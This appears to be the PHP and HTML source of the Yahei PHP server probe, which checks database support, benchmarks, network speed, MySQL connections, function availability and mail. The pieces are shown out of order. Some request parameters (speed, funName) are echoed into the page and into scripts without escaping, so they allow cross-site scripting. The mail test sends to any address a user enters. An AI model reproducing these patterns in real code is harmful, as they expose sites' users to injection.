        $s &#x3D; $s ? &#39;&amp;nbsp; mysql_server 版本：&#39;.$s : &#39;&#39;;

	    $c &#x3D; &#39;&amp;nbsp; mysql_client 版本：&#39;.@mysql_get_client_info();

        echo $s;

    &#125;

    ?&gt;

	&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;32%&quot;&gt;ODBC 数据库：&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;18%&quot;&gt;&lt;?php echo isfun(&quot;odbc_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Oracle 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ora_close&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;SQL Server 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;mssql_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;dBASE 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;dbase_close&quot;);?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;mSQL 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;msql_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;SQLite 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php if(extension_loaded(&#39;sqlite3&#39;)) &#123;$sqliteVer &#x3D; SQLite3::version();echo &#39;&lt;font color&#x3D;green&gt;√&lt;&#x2F;font&gt;　&#39;;echo &quot;SQLite3　Ver &quot;;echo $sqliteVer[versionString];&#125;else &#123;echo isfun(&quot;sqlite_close&quot;);if(isfun(&quot;sqlite_close&quot;) &#x3D;&#x3D; &#39;&lt;font color&#x3D;&quot;green&quot;&gt;√&lt;&#x2F;font&gt;&#39;) &#123;echo &quot;&amp;nbsp; 版本： &quot;.@sqlite_libversion();&#125;&#125;?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;Hyperwave 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;hw_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td&gt;Postgre SQL 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;pg_close&quot;); ?&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;Informix 数据库：&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo isfun(&quot;ifx_close&quot;);?&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td&gt;DBA 数据库：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;dba_close&quot;);?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;DBM 数据库：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;dbmclose&quot;);?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;    
  &lt;tr&gt;
    &lt;td&gt;FilePro 数据库：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;filepro_fieldcount&quot;);?&gt;&lt;&#x2F;td&gt;
    &lt;td&gt;SyBase 数据库：&lt;&#x2F;td&gt;
    &lt;td&gt;&lt;?php echo isfun(&quot;sybase_close&quot;);?&gt;&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt; 

&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_performance&quot;&gt;&lt;&#x2F;a&gt;&lt;a name&#x3D;&quot;bottom&quot;&gt;&lt;&#x2F;a&gt;

&lt;form action&#x3D;&quot;&lt;?php echo $_SERVER[PHP_SELF].&quot;#bottom&quot;;?&gt;&quot; method&#x3D;&quot;post&quot;&gt;

&lt;!--服务器性能检测--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;5&quot;&gt;服务器性能检测&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td width&#x3D;&quot;19%&quot;&gt;参照对象&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;17%&quot;&gt;整数运算能力检测&lt;br &#x2F;&gt;(1+1运算300万次)&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;17%&quot;&gt;浮点运算能力检测&lt;br &#x2F;&gt;(圆周率开平方300万次)&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;17%&quot;&gt;数据I&#x2F;O能力检测&lt;br &#x2F;&gt;(读取10K文件1万次)&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;30%&quot;&gt;CPU信息&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;
  &lt;tr align&#x3D;&quot;center&quot;&gt;
    &lt;td align&#x3D;&quot;left&quot;&gt;美国 LinodeVPS&lt;&#x2F;td&gt;
    &lt;td&gt;0.357秒&lt;&#x2F;td&gt;
    &lt;td&gt;0.802秒&lt;&#x2F;td&gt;
    &lt;td&gt;0.023秒&lt;&#x2F;td&gt;
    &lt;td align&#x3D;&quot;left&quot;&gt;4 x Xeon L5520 @ 2.27GHz&lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt; 

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;美国 PhotonVPS.com&lt;&#x2F;td&gt;

    &lt;td&gt;0.431秒&lt;&#x2F;td&gt;

    &lt;td&gt;1.024秒&lt;&#x2F;td&gt;

    &lt;td&gt;0.034秒&lt;&#x2F;td&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;8 x Xeon E5520 @ 2.27GHz&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;德国 SpaceRich.com&lt;&#x2F;td&gt;

    &lt;td&gt;0.421秒&lt;&#x2F;td&gt;

    &lt;td&gt;1.003秒&lt;&#x2F;td&gt;

    &lt;td&gt;0.038秒&lt;&#x2F;td&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;4 x Core i7 920 @ 2.67GHz&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;美国 RiZie.com&lt;&#x2F;td&gt;

    &lt;td&gt;0.521秒&lt;&#x2F;td&gt;

    &lt;td&gt;1.559秒&lt;&#x2F;td&gt;

    &lt;td&gt;0.054秒&lt;&#x2F;td&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;2 x Pentium4 3.00GHz&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;埃及 CitynetHost.com&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;0.343秒&lt;&#x2F;td&gt;

    &lt;td&gt;0.761秒&lt;&#x2F;td&gt;

    &lt;td&gt;0.023秒&lt;&#x2F;td&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;2 x Core2Duo E4600 @ 2.40GHz&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;美国 IXwebhosting.com&lt;&#x2F;td&gt;

    &lt;td&gt;0.535秒&lt;&#x2F;td&gt;

    &lt;td&gt;1.607秒&lt;&#x2F;td&gt;

    &lt;td&gt;0.058秒&lt;&#x2F;td&gt;

    &lt;td align&#x3D;&quot;left&quot;&gt;4 x Xeon E5530 @ 2.40GHz&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;tr align&#x3D;&quot;center&quot;&gt;

    &lt;td&gt;本台服务器&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo $valInt;?&gt;&lt;br &#x2F;&gt;&lt;input class&#x3D;&quot;btn&quot; name&#x3D;&quot;act&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;整型测试&quot; &#x2F;&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo $valFloat;?&gt;&lt;br &#x2F;&gt;&lt;input class&#x3D;&quot;btn&quot; name&#x3D;&quot;act&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;浮点测试&quot; &#x2F;&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;?php echo $valIo;?&gt;&lt;br &#x2F;&gt;&lt;input class&#x3D;&quot;btn&quot; name&#x3D;&quot;act&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;IO测试&quot; &#x2F;&gt;&lt;&#x2F;td&gt;

    &lt;td&gt;&lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;pInt&quot; value&#x3D;&quot;&lt;?php echo $valInt;?&gt;&quot; &#x2F;&gt;

&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;pFloat&quot; value&#x3D;&quot;&lt;?php echo $valFloat;?&gt;&quot; &#x2F;&gt;

&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;pIo&quot; value&#x3D;&quot;&lt;?php echo $valIo;?&gt;&quot; &#x2F;&gt;

&lt;a name&#x3D;&quot;w_networkspeed&quot;&gt;&lt;&#x2F;a&gt;
&lt;!--网络速度测试--&gt;
&lt;table&gt;
	&lt;tr&gt;&lt;th colspan&#x3D;&quot;3&quot;&gt;网络速度测试&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;
  &lt;tr&gt;
    &lt;td width&#x3D;&quot;19%&quot; align&#x3D;&quot;center&quot;&gt;&lt;input name&#x3D;&quot;act&quot; type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn&quot; value&#x3D;&quot;开始测试&quot; &#x2F;&gt;
        &lt;br &#x2F;&gt;
	向客户端传送1000k字节数据&lt;br &#x2F;&gt;
	带宽比例按理想值计算
	&lt;&#x2F;td&gt;
    &lt;td width&#x3D;&quot;81%&quot; align&#x3D;&quot;center&quot; &gt;

  &lt;table align&#x3D;&quot;center&quot; width&#x3D;&quot;550&quot; border&#x3D;&quot;0&quot; cellspacing&#x3D;&quot;0&quot; cellpadding&#x3D;&quot;0&quot; &gt;
    &lt;tr &gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;带宽&lt;&#x2F;td&gt;
	&lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;1M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;2M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;3M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;4M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;5M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;6M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;7M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;8M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;9M&lt;&#x2F;td&gt;
    &lt;td height&#x3D;&quot;15&quot; width&#x3D;&quot;50&quot;&gt;10M&lt;&#x2F;td&gt;
    &lt;&#x2F;tr&gt;
   &lt;tr&gt;
    &lt;td colspan&#x3D;&quot;11&quot; class&#x3D;&quot;suduk&quot; &gt;&lt;table align&#x3D;&quot;center&quot; width&#x3D;&quot;550&quot; border&#x3D;&quot;0&quot; cellspacing&#x3D;&quot;0&quot; cellpadding&#x3D;&quot;0&quot; height&#x3D;&quot;8&quot; class&#x3D;&quot;suduk&quot;&gt;
    &lt;tr&gt;
      &lt;td class&#x3D;&quot;sudu&quot;  width&#x3D;&quot;&lt;?php 
	if(preg_match(&quot;&#x2F;[^\d-., ]&#x2F;&quot;,$speed))
		&#123;
			echo &quot;0&quot;;
		&#125;
	else&#123;
			echo 550*($speed&#x2F;11000);
		&#125; 
		?&gt;&quot;&gt;&lt;&#x2F;td&gt;
      &lt;td class&#x3D;&quot;suduk&quot; width&#x3D;&quot;&lt;?php 
	if(preg_match(&quot;&#x2F;[^\d-., ]&#x2F;&quot;,$speed))
		&#123;
			echo &quot;550&quot;;
		&#125;
	else&#123;
			echo 550-550*($speed&#x2F;11000);
		&#125; 
		?&gt;&quot;&gt;&lt;&#x2F;td&gt;
    &lt;&#x2F;tr&gt;
    &lt;&#x2F;table&gt;
   &lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
  &lt;&#x2F;table&gt;
  &lt;?php echo (isset($_GET[&#39;speed&#39;]))?&quot;下载1000KB数据用时 &lt;font color&#x3D;&#39;#cc0000&#39;&gt;&quot;.$_GET[&#39;speed&#39;].&quot;&lt;&#x2F;font&gt; 毫秒，下载速度：&quot;.&quot;&lt;font color&#x3D;&#39;#cc0000&#39;&gt;&quot;.$speed.&quot;&lt;&#x2F;font&gt;&quot;.&quot; kb&#x2F;s，需测试多次取平均值，超过10M直接看下载速度&quot;:&quot;&lt;font color&#x3D;&#39;#cc0000&#39;&gt;&amp;nbsp;未探测&amp;nbsp;&lt;&#x2F;font&gt;&quot; ?&gt;

    &lt;&#x2F;td&gt;
  &lt;&#x2F;tr&gt;
&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_MySQL&quot;&gt;&lt;&#x2F;a&gt;

&lt;!--MySQL数据库连接检测--&gt;

&lt;table&gt;

	&lt;tr&gt;&lt;th colspan&#x3D;&quot;3&quot;&gt;MySQL数据库连接检测&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;15%&quot;&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;60%&quot;&gt;

      地址：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;host&quot; value&#x3D;&quot;localhost&quot; size&#x3D;&quot;10&quot; &#x2F;&gt;

      端口：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;port&quot; value&#x3D;&quot;3306&quot; size&#x3D;&quot;10&quot; &#x2F;&gt;

      用户名：&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;login&quot; size&#x3D;&quot;10&quot; &#x2F;&gt;

      密码：&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; size&#x3D;&quot;10&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;25%&quot;&gt;

      &lt;input class&#x3D;&quot;btn&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;act&quot; value&#x3D;&quot;MySQL检测&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

&lt;&#x2F;table&gt;

  &lt;?php

  if ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;MySQL检测&#39;) &#123;

  	if(function_exists(&quot;mysql_close&quot;)&#x3D;&#x3D;1) &#123;

  		$link &#x3D; @mysql_connect($host.&quot;:&quot;.$port,$login,$password);

  		if ($link)&#123;

  			echo &quot;&lt;script&gt;alert(&#39;连接到MySql数据库正常&#39;)&lt;&#x2F;script&gt;&quot;;

  		&#125; else &#123;

  			echo &quot;&lt;script&gt;alert(&#39;无法连接到MySql数据库！&#39;)&lt;&#x2F;script&gt;&quot;;

  		&#125;

  	&#125; else &#123;

  		echo &quot;&lt;script&gt;alert(&#39;服务器不支持MySQL数据库！&#39;)&lt;&#x2F;script&gt;&quot;;

  	&#125;

  &#125;

	?&gt;
	
&lt;a name&#x3D;&quot;w_function&quot;&gt;&lt;&#x2F;a&gt;

&lt;!--函数检测--&gt;

&lt;table&gt;

	&lt;tr&gt;&lt;th colspan&#x3D;&quot;3&quot;&gt;函数检测&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;15%&quot;&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;60%&quot;&gt;

      请输入您要检测的函数：

      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;funName&quot; size&#x3D;&quot;50&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;25%&quot;&gt;

      &lt;input class&#x3D;&quot;btn&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;act&quot; align&#x3D;&quot;right&quot; value&#x3D;&quot;函数检测&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;?php

  if ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;函数检测&#39;) &#123;

  	echo &quot;&lt;script&gt;alert(&#39;$funRe&#39;)&lt;&#x2F;script&gt;&quot;;

  &#125;

  ?&gt;

&lt;&#x2F;table&gt;

&lt;a name&#x3D;&quot;w_mail&quot;&gt;&lt;&#x2F;a&gt;

&lt;!--邮件发送检测--&gt;

&lt;table&gt;

  &lt;tr&gt;&lt;th colspan&#x3D;&quot;3&quot;&gt;邮件发送检测&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;

  &lt;tr&gt;

    &lt;td width&#x3D;&quot;15%&quot;&gt;&lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;60%&quot;&gt;

      请输入您要检测的邮件地址：

      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;mailAdd&quot; size&#x3D;&quot;50&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

    &lt;td width&#x3D;&quot;25%&quot;&gt;

    &lt;input class&#x3D;&quot;btn&quot; type&#x3D;&quot;submit&quot; name&#x3D;&quot;act&quot; value&#x3D;&quot;邮件检测&quot; &#x2F;&gt;

    &lt;&#x2F;td&gt;

  &lt;&#x2F;tr&gt;

  &lt;?php

  if ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;邮件检测&#39;) &#123;

  	echo &quot;&lt;script&gt;alert(&#39;$mailRe&#39;)&lt;&#x2F;script&gt;&quot;;

  &#125;

  ?&gt;

&lt;&#x2F;table&gt;

&lt;&#x2F;form&gt;



	&lt;table&gt;
		&lt;tr&gt;
			&lt;td class&#x3D;&quot;w_foot&quot;&gt;&lt;A HREF&#x3D;&quot;http:&#x2F;&#x2F;www.Yahei.Net&quot; target&#x3D;&quot;_blank&quot;&gt;&lt;?php echo $title.$version;?&gt;&lt;&#x2F;A&gt;&lt;&#x2F;td&gt;
			&lt;td class&#x3D;&quot;w_foot&quot;&gt;&lt;?php $run_time &#x3D; sprintf(&#39;%0.4f&#39;, microtime_float() - $time_start);?&gt;Processed in &lt;?php echo $run_time?&gt; seconds. &lt;?php echo memory_usage();?&gt; memory usage.&lt;&#x2F;td&gt;
			&lt;td class&#x3D;&quot;w_foot&quot;&gt;&lt;a href&#x3D;&quot;#w_top&quot;&gt;返回顶部&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
		&lt;&#x2F;tr&gt;
	&lt;&#x2F;table&gt;

&lt;&#x2F;div&gt;

&lt;&#x2F;body&gt;

&lt;&#x2F;html&gt;
&lt;?php
&#x2F;* ---------------------------------------------------- *&#x2F;
&#x2F;* 程序名称: PHP探针-Yahei
&#x2F;* 程序功能: 探测系统的Web服务器运行环境
&#x2F;* 程序开发: Yahei.Net
&#x2F;* 联系方式: info@Yahei.net
&#x2F;* Date: 1970-01-01 &#x2F; 2012-07-08
&#x2F;* ---------------------------------------------------- *&#x2F;
&#x2F;* 使用条款:
&#x2F;* 1.该软件免费使用.
&#x2F;* 2.禁止任何衍生版本.
&#x2F;* ---------------------------------------------------- *&#x2F;
&#x2F;* 感谢以下朋友为探针做出的贡献:
&#x2F;* zyypp,酷を龙卷风,龙智超,菊花肿了,闲人,Clare Lou,hotsnow
&#x2F;* 二戒,yexinzhu,wangyu1314,Kokgog,gibyasus,黃子珅,A大,huli
&#x2F;* 小松,charwin,华景网络
&#x2F;* 您可能是下一个?
&#x2F;* ---------------------------------------------------- *&#x2F;
error_reporting(0); &#x2F;&#x2F;抑制所有错误信息
@header(&quot;content-Type: text&#x2F;html; charset&#x3D;utf-8&quot;); &#x2F;&#x2F;语言强制
ob_start();
date_default_timezone_set(&#39;Asia&#x2F;Shanghai&#39;);&#x2F;&#x2F;此句用于消除时间差

$title &#x3D; &#39;雅黑PHP探针[简体版]&#39;;

$version &#x3D; &quot;v0.4.7&quot;; &#x2F;&#x2F;版本号



define(&#39;HTTP_HOST&#39;, preg_replace(&#39;~^www\.~i&#39;, &#39;&#39;, $_SERVER[&#39;HTTP_HOST&#39;]));



$time_start &#x3D; microtime_float();



function memory_usage() 
&#123;

	$memory	 &#x3D; ( ! function_exists(&#39;memory_get_usage&#39;)) ? &#39;0&#39; : round(memory_get_usage()&#x2F;1024&#x2F;1024, 2).&#39;MB&#39;;

	return $memory;

&#125;


&#x2F;&#x2F; 计时

function microtime_float() 
&#123;

	$mtime &#x3D; microtime();

	$mtime &#x3D; explode(&#39; &#39;, $mtime);

	return $mtime[1] + $mtime[0];

&#125;


&#x2F;&#x2F;单位转换
function formatsize($size) 
&#123;
	$danwei&#x3D;array(&#39; B &#39;,&#39; K &#39;,&#39; M &#39;,&#39; G &#39;,&#39; T &#39;);
	$allsize&#x3D;array();
	$i&#x3D;0;

	for($i &#x3D; 0; $i &lt;5; $i++) 
	&#123;
		if(floor($size&#x2F;pow(1024,$i))&#x3D;&#x3D;0)&#123;break;&#125;
	&#125;

	for($l &#x3D; $i-1; $l &gt;&#x3D;0; $l--) 
	&#123;
		$allsize1[$l]&#x3D;floor($size&#x2F;pow(1024,$l));
		$allsize[$l]&#x3D;$allsize1[$l]-$allsize1[$l+1]*1024;
	&#125;

	$len&#x3D;count($allsize);

	for($j &#x3D; $len-1; $j &gt;&#x3D;0; $j--) 
	&#123;
		$fsize&#x3D;$fsize.$allsize[$j].$danwei[$j];
	&#125;	
	return $fsize;
&#125;


function valid_email($str) 
&#123;

	return ( ! preg_match(&quot;&#x2F;^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]&#123;2,6&#125;$&#x2F;ix&quot;, $str)) ? FALSE : TRUE;

&#125;


&#x2F;&#x2F;检测PHP设置参数

function show($varName)
&#123;

	switch($result &#x3D; get_cfg_var($varName))
	&#123;

		case 0:

			return &#39;&lt;font color&#x3D;&quot;red&quot;&gt;×&lt;&#x2F;font&gt;&#39;;

		break;
		

		case 1:

			return &#39;&lt;font color&#x3D;&quot;green&quot;&gt;√&lt;&#x2F;font&gt;&#39;;

		break;
		

		default:

			return $result;

		break;

	&#125;

&#125;



&#x2F;&#x2F;保留服务器性能测试结果

$valInt &#x3D; isset($_POST[&#39;pInt&#39;]) ? $_POST[&#39;pInt&#39;] : &quot;未测试&quot;;

$valFloat &#x3D; isset($_POST[&#39;pFloat&#39;]) ? $_POST[&#39;pFloat&#39;] : &quot;未测试&quot;;

$valIo &#x3D; isset($_POST[&#39;pIo&#39;]) ? $_POST[&#39;pIo&#39;] : &quot;未测试&quot;;



if ($_GET[&#39;act&#39;] &#x3D;&#x3D; &quot;phpinfo&quot;) 
&#123;

	phpinfo();

	exit();

&#125; 
elseif($_POST[&#39;act&#39;] &#x3D;&#x3D; &quot;整型测试&quot;)
&#123;

	$valInt &#x3D; test_int();

&#125; 
elseif($_POST[&#39;act&#39;] &#x3D;&#x3D; &quot;浮点测试&quot;)
&#123;

	$valFloat &#x3D; test_float();

&#125; 
elseif($_POST[&#39;act&#39;] &#x3D;&#x3D; &quot;IO测试&quot;)
&#123;

	$valIo &#x3D; test_io();

&#125; 
&#x2F;&#x2F;网速测试-开始
elseif($_POST[&#39;act&#39;]&#x3D;&#x3D;&quot;开始测试&quot;)
&#123;
?&gt;
	&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;
		var acd1;
		acd1 &#x3D; new Date();
		acd1ok&#x3D;acd1.getTime();
	&lt;&#x2F;script&gt;
	&lt;?php
	for($i&#x3D;1;$i&lt;&#x3D;100000;$i++)
	&#123;
		echo &quot;&lt;!--567890#########0#########0#########0#########0#########0#########0#########0#########012345--&gt;&quot;;
	&#125;
	?&gt;
	&lt;script language&#x3D;&quot;javascript&quot; type&#x3D;&quot;text&#x2F;javascript&quot;&gt;
		var acd2;
		acd2 &#x3D; new Date();
		acd2ok&#x3D;acd2.getTime();
		window.location &#x3D; &#39;?speed&#x3D;&#39; +(acd2ok-acd1ok)+&#39;#w_networkspeed&#39;;
	&lt;&#x2F;script&gt;
&lt;?php
&#125;
&#x2F;&#x2F;网速测试-结束
elseif($_GET[&#39;act&#39;] &#x3D;&#x3D; &quot;Function&quot;)
&#123;
	$arr &#x3D; get_defined_functions();
	Function php()
	&#123;
	&#125;
	echo &quot;&lt;pre&gt;&quot;;
	Echo &quot;这里显示系统所支持的所有函数,和自定义函数\n&quot;;
	print_r($arr);
	echo &quot;&lt;&#x2F;pre&gt;&quot;;
	exit();
&#125;elseif($_GET[&#39;act&#39;] &#x3D;&#x3D; &quot;disable_functions&quot;)
&#123;
	$disFuns&#x3D;get_cfg_var(&quot;disable_functions&quot;);
	if(empty($disFuns))
	&#123;
		$arr &#x3D; &#39;&lt;font color&#x3D;red&gt;×&lt;&#x2F;font&gt;&#39;;
	&#125;
	else
	&#123; 
		$arr &#x3D; $disFuns;
	&#125;
	Function php()
	&#123;
	&#125;
	echo &quot;&lt;pre&gt;&quot;;
	Echo &quot;这里显示系统被禁用的函数\n&quot;;
	print_r($arr);
	echo &quot;&lt;&#x2F;pre&gt;&quot;;
	exit();
&#125;



&#x2F;&#x2F;MySQL检测

if ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;MySQL检测&#39;)
&#123;

	$host &#x3D; isset($_POST[&#39;host&#39;]) ? trim($_POST[&#39;host&#39;]) : &#39;&#39;;

	$port &#x3D; isset($_POST[&#39;port&#39;]) ? (int) $_POST[&#39;port&#39;] : &#39;&#39;;

	$login &#x3D; isset($_POST[&#39;login&#39;]) ? trim($_POST[&#39;login&#39;]) : &#39;&#39;;

	$password &#x3D; isset($_POST[&#39;password&#39;]) ? trim($_POST[&#39;password&#39;]) : &#39;&#39;;

	$host &#x3D; preg_match(&#39;~[^a-z0-9\-\.]+~i&#39;, $host) ? &#39;&#39; : $host;

	$port &#x3D; intval($port) ? intval($port) : &#39;&#39;;

	$login &#x3D; preg_match(&#39;~[^a-z0-9\_\-]+~i&#39;, $login) ? &#39;&#39; : htmlspecialchars($login);

	$password &#x3D; is_string($password) ? htmlspecialchars($password) : &#39;&#39;;

&#125;
elseif ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;函数检测&#39;)
&#123;

	$funRe &#x3D; &quot;函数&quot;.$_POST[&#39;funName&#39;].&quot;支持状况检测结果：&quot;.isfun1($_POST[&#39;funName&#39;]);

&#125; 
elseif ($_POST[&#39;act&#39;] &#x3D;&#x3D; &#39;邮件检测&#39;)
&#123;

	$mailRe &#x3D; &quot;邮件发送检测结果：发送&quot;;
	if($_SERVER[&#39;SERVER_PORT&#39;]&#x3D;&#x3D;80)&#123;$mailContent &#x3D; &quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;SERVER_NAME&#39;].($_SERVER[&#39;PHP_SELF&#39;] ? $_SERVER[&#39;PHP_SELF&#39;] : $_SERVER[&#39;SCRIPT_NAME&#39;]);&#125;
	else&#123;$mailContent &#x3D; &quot;http:&#x2F;&#x2F;&quot;.$_SERVER[&#39;SERVER_NAME&#39;].&quot;:&quot;.$_SERVER[&#39;SERVER_PORT&#39;].($_SERVER[&#39;PHP_SELF&#39;] ? $_SERVER[&#39;PHP_SELF&#39;] : $_SERVER[&#39;SCRIPT_NAME&#39;]);&#125;
	$mailRe .&#x3D; (false !&#x3D;&#x3D; @mail($_POST[&quot;mailAdd&quot;], $mailContent, &quot;This is a test mail!&quot;)) ? &quot;完成&quot;:&quot;失败&quot;;

&#125;


&#x2F;&#x2F;网络速度测试
if(isset($_POST[&#39;speed&#39;]))
&#123;
	$speed&#x3D;round(100&#x2F;($_POST[&#39;speed&#39;]&#x2F;1000),2);
&#125;
elseif($_GET[&#39;speed&#39;]&#x3D;&#x3D;&quot;0&quot;)
&#123;
	$speed&#x3D;6666.67;
&#125;
elseif(isset($_GET[&#39;speed&#39;]) and $_GET[&#39;speed&#39;]&gt;0)
&#123;
	$speed&#x3D;round(100&#x2F;($_GET[&#39;speed&#39;]&#x2F;1000),2); &#x2F;&#x2F;下载速度：$speed kb&#x2F;s
&#125;
else
&#123;
	$speed&#x3D;&quot;&lt;font color&#x3D;\&quot;red\&quot;&gt;&amp;nbsp;未探测&amp;nbsp;&lt;&#x2F;font&gt;&quot;;
&#125;	
	
	

&#x2F;&#x2F; 检测函数支持

function isfun($funName &#x3D; &#39;&#39;)
&#123;

    if (!$funName || trim($funName) &#x3D;&#x3D; &#39;&#39; || preg_match(&#39;~[^a-z0-9\_]+~i&#39;, $funName, $tmp)) return &#39;错误&#39;;

